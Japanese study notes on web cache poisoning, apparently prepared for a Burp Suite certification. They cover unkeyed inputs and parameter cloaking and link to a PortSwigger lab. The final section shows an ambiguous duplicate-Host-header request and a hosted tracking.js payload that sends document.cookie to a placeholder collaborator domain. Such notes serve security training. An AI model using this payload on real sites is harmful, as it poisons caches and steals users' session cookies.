
- Unkey = その値を操作してもキャッシュ状態には変化がない部分([2. 実装の欠陥の探索](4.%20キャッシュ実装の欠陥の悪用/2.%20実装の欠陥の探索.md#Cacheされている兆候))
- ==⚠️==検証時はキャッシュバスターを追加すること

- [3. キャッシュ設計の欠陥の悪用](3.%20キャッシュ設計の欠陥の悪用.md)
	- Unkeyed header
	- Cookie-based Webキャッシュポイズニング
	- 複数のヘッダを使用したWebキャッシュポイズニング
	- 必要以上の情報を提供するレスポンスの悪用

- [3. 実装の欠陥の悪用](4.%20キャッシュ実装の欠陥の悪用/3.%20実装の欠陥の悪用.md)
	- Unkeyed ポート
	- Unkeyed クエリストリング
	- Unkeyed クエリパラメタ
	- Parameter cloaking
		- パラメタ解析の癖を悪用
		- HTTPメソッドがUnkeyedであることを悪用
	- 正規化されたCache keyの悪用

### & Host header attack

- [⚡️HTTP Host header attack](../HTTP%20Host%20header%20attacks/⚡️HTTP%20Host%20header%20attack.md#&%20Web%20cache%20poisoning)

UnkeyがHostヘッダの時

```http
Host: TARGET_NET
Host: EXPLOIT_DOMAIN
```
[![Ambiguous Hosts](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/ambiguous-hosts.png)](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/ambiguous-hosts.png)
- エクスプロイトサーバに同じ名前でファイルを作成し、悪意あるペイロードをホストしておく
```
/resources/js/tracking.js
```
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

document.location='https://COLLABORATOR_DOMAIN/?cookies='+document.cookie;
```

[Lab](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests)

---
